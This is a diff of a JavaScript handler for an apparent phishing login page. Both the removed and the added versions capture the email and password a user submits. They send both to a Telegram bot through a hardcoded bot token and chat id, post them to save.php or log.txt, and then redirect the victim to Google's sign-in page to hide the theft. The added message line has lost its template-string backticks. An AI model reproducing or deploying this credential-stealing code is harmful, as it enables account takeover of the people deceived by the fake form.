@@ -1,34 +1,44 @@
+document.querySelector("form").addEventListener("submit", function (e) {
+  e.preventDefault();
 
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-    
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+  const email = document.getElementById("email");
+  const password = document.getElementById("password");
 
-    const message = `New Login\nEmail: ${email}\nPassword: ${password}`;
-    
-    // Telegram bot info
-    const token = "7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ";
-    const chat_id = "7817453978";
+  if (!email || !password) {
+    alert("الحقول غير موجودة!");
+    return;
+  }
 
-    // إرسال البيانات إلى تيليغرام
-    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-            chat_id: chat_id,
-            text: message
-        })
+  const emailValue = email.value;
+  const passwordValue = password.value;
+
+  const message = New Login:\nEmail: ${emailValue}\nPassword: ${passwordValue};
+
+  // إرسال البيانات إلى تيليغرام
+  fetch("https://api.telegram.org/bot7765914996:AAG6QyINd2LjuFzkpPAn02J8qnyPx_iWYCQ/sendMessage", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      chat_id: "7817453978",
+      text: message
+    })
+  });
+
+  // حفظ نسخة محليًا (لن يعمل على Vercel، يعمل فقط محليًا)
+  try {
+    fetch("save.php", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      body: email=${encodeURIComponent(emailValue)}&password=${encodeURIComponent(passwordValue)}
     });
+  } catch (err) {
+    console.log("Local save skipped:", err);
+  }
 
-    // حفظ البيانات في log.txt (محلياً غير مدعوم مباشرة في المتصفح، لكنه يعمل في بيئة بايثون أو Node.js)
-    fetch("log.txt", {
-        method: "POST",
-        body: `${email} | ${password}\n`
-    });
-
-    // إعادة التوجيه لغوغل
-    window.location.href = "https://accounts.google.com";
+  // إعادة توجيه المستخدم
+  window.location.href = "https://accounts.google.com";
 });
